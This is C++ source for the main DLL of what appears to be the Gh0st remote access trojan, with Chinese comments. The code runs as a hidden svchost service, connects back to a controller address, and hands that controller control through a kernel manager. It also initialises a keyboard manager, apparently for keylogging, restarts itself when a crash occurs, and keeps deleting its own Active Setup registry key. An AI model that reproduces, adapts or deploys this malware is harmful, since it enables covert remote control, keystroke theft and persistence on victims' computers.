// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "common/KeyboardManager.h"
#include "common/KernelManager.h"
#include "common/login.h"
#include "common/install.h"
#include <stdio.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

char g_strSvchostName[MAX_PATH];
char g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;


char	svcname[MAX_PATH];
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

struct Connect_Address
{
	DWORD dwstact;
	char  strIP[MAX_PATH];
	int   nPort;
}g_myAddress = { 0x1234567,"",0 };

enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};


DWORD WINAPI main(char* lpServiceName);
//处理异常
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 发生异常，重新创建进程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
DWORD WINAPI main(char* lpServiceName)
{
	char	strServiceName[256];
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	strcpy(g_strHost, g_myAddress.strIP);
	g_dwPort = g_myAddress.nPort;

	//--这里是同窗口交互
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////

	 //--这里判断CKeyboardManager::g_hInstance是否为空 如果不为空则开启错误处理
	 //--这里要在dllmain中为CKeyboardManager::g_hInstance赋值
	if (CKeyboardManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了

		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // 随机事件名

		hInstallMutex = CreateMutex(NULL, true, g_strHost);
		//ReConfigService(strServiceName);   //--lang--
		// 删除安装文件
	//	DeleteInstallFile(lpServiceName);     //--lang--
	}
	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
	SetErrorMode(SEM_FAILCRITICALERRORS);
	char* lpszHost = NULL;
	DWORD	dwPort = 80;
	char* lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char* lpszProxyUser = NULL;
	char* lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	//---这里声明了一个 CClientSocket类
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
	//--这里判断是否连接成功如果不成功则继续向下
	while (1)
	{
		// 如果不是心跳超时，不用再sleep两分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;

				}
				// 改一下
				Sleep(60);
			}
		}
		//上线地址
		lpszHost = g_strHost;
		dwPort = g_dwPort;

		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
		//---调用Connect函数向主控端发起连接
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //---连接错误跳出本次循环
			continue;
		}
		// 登录
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		//---注意这里连接成功后声明了一个CKernelManager 到CKernelManager类查看一下
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢复卓面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);

}

extern "C" __declspec(dllexport) void TestRun(char* strHost, int nPort)
{
	strcpy(g_strHost, strHost);   // 保存上线地址
	g_dwPort = nPort;             // 保存上线端口
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)g_strHost, 0, NULL);
	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}
BOOL APIENTRY DllMain(HANDLE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		CKeyboardManager::Initialization();
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

int TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwCurrentState = g_dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 1000;
	return SetServiceStatus(hServiceStatus, &srvStatus);
}

void __stdcall ServiceHandler(DWORD dwControl)
{
	// not really necessary because the service stops quickly
	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		Sleep(10);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;
	case SERVICE_CONTROL_PAUSE:
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;
	case SERVICE_CONTROL_CONTINUE:
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM(g_dwCurrState, 0, 0);
		break;
	}
}


extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[])
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
	wcstombs(svcname, argv[0], sizeof svcname);
	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
	if (hServiceStatus == NULL)
	{
		return;
	}
	else FreeConsole();

	TellSCM(SERVICE_START_PENDING, 0, 1);
	TellSCM(SERVICE_RUNNING, 0, 0);
	// call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	do {
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	} while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (g_dwServiceType == 0x120)
	{
		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
		while (1) Sleep(10000);
	}
	return;
}


DWORD WINAPI DelAXRegThread(LPVOID lpParam)
{
	char strFileName[MAX_PATH];     //dll文件名
	char* pstrTemp = NULL;
	char ActiveXStr[1024];           //activex 键值字符串

	ZeroMemory(ActiveXStr, 1024);
	ZeroMemory(strFileName, MAX_PATH);
	//得到自身文件名
	GetModuleFileName(CKeyboardManager::g_hInstance, strFileName, MAX_PATH);
	PathStripPath(strFileName); //将完整文件名转换为文件名
	pstrTemp = strstr(strFileName, ".dll");  //寻找 .dll然后将他删除掉
	if (pstrTemp != NULL)
	{
		ZeroMemory(pstrTemp, strlen(pstrTemp));  //删除掉扩展名
		//构造键值
		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", strFileName);
		while (1)
		{
			//不停的删除注册表
			RegDeleteKey(HKEY_CURRENT_USER, ActiveXStr);
			OutputDebugString(ActiveXStr);      //输出删除的字串用以测试
			Sleep(1000 * 30);
		}
	}
	return 0;

}


extern "C" __declspec(dllexport) void MainRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
{
	MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DelAXRegThread, NULL, 0, NULL);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
}

extern "C" __declspec(dllexport) void FirstRun(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
{
	char strMyFileName[MAX_PATH], strCmdLine[MAX_PATH];
	ZeroMemory(strMyFileName, MAX_PATH);
	ZeroMemory(strCmdLine, MAX_PATH);
	//得到自身文件名
	GetModuleFileName(CKeyboardManager::g_hInstance, strMyFileName, MAX_PATH);
	//构造启动参数
	sprintf(strCmdLine, "%s %s,MainRun", "rundll32.exe", strMyFileName);

	//启动服务端
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb = sizeof(STARTUPINFO);
	StartInfo.lpDesktop = NULL;
	StartInfo.lpReserved = NULL;
	StartInfo.lpTitle = NULL;
	StartInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2 = 0;
	StartInfo.lpReserved2 = NULL;
	StartInfo.wShowWindow = SW_SHOWNORMAL;
	BOOL bReturn = CreateProcess(NULL, strCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &StartInfo, &ProcessInformation);

}

